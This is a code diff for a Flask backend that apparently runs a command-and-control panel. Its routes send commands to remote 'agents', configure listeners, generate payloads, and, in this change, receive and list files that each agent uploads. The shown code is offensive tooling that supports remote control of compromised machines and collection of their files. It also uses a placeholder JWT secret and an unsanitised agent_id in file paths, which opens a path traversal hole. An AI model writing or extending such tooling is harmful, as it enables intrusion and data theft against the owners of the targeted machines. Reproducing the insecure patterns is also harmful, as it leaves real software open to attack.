@@ -9,6 +9,7 @@ from flask_socketio import SocketIO, emit
 import socket
 import json
 from werkzeug.security import check_password_hash, generate_password_hash
+from werkzeug.utils import secure_filename
 from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity
 from dotenv import load_dotenv
 
@@ -20,6 +21,13 @@ app = Flask(__name__)
 socketio = SocketIO(app, cors_allowed_origins="http://localhost:3000")
 
 load_dotenv()
+
+# Define the path to the uploads folder
+UPLOADS_FOLDER = os.path.join(app.root_path, 'uploads')
+app.config['UPLOADS_FOLDER'] = UPLOADS_FOLDER
+
+# Ensure the uploads folder exists
+os.makedirs(UPLOADS_FOLDER, exist_ok=True)
 
 app.config['JWT_SECRET_KEY'] = 'your_jwt_secret_key'
 jwt = JWTManager(app)
@@ -79,7 +87,6 @@ def create_update_default_admin():
             admin_user.password_hash = generate_password_hash(admin_password)
         db.session.commit()
 
-
 create_update_default_admin()
 
 @app.route('/api/execute-command', methods=['POST'])
@@ -87,7 +94,7 @@ def execute_command():
     data = request.get_json()
     agent_id = data.get('agentId')
     command = data.get('command')
-
+    
     # Connect to your TCP server
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect(('127.0.0.1', 62347))
@@ -102,6 +109,33 @@ def execute_command():
         print("------------------------------------")
 
     return jsonify({'status': 'Command sent to TCP server', 'response': response}), 200
+
+# Flask route to handle file uploads in your backend
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    agent_id = request.form['agent_id']
+    file = request.files.get('file')
+    if file:
+        filename = secure_filename(file.filename)
+        # You might want to organize uploads by agent ID
+        agent_upload_folder = os.path.join(app.config['UPLOADS_FOLDER'], agent_id)
+        os.makedirs(agent_upload_folder, exist_ok=True)
+        
+        file_path = os.path.join(agent_upload_folder, filename)
+        file.save(file_path)
+        
+        return jsonify({'message': f'File {filename} uploaded successfully.'})
+    else:
+        return jsonify({'error': 'No file provided'}), 400
+
+@app.route('/list_files/<agent_id>', methods=['GET'])
+def list_files(agent_id):
+    agent_upload_folder = os.path.join(app.config['UPLOADS_FOLDER'], agent_id)
+    if os.path.isdir(agent_upload_folder):
+        files = os.listdir(agent_upload_folder)
+        return jsonify({'files': files})
+    else:
+        return jsonify({'error': 'Agent not found'}), 404
 
 @app.route('/api/configure-listener', methods=['POST'])
 def configure_listener():
@@ -272,7 +306,6 @@ def generate_payload():
 
     download_url = f"http://{request.host}/download/{filename}"
     return jsonify({"message": "Payload generated successfully", "downloadUrl": download_url})
-
 
 @socketio.on('connect')
 def handle_connect():
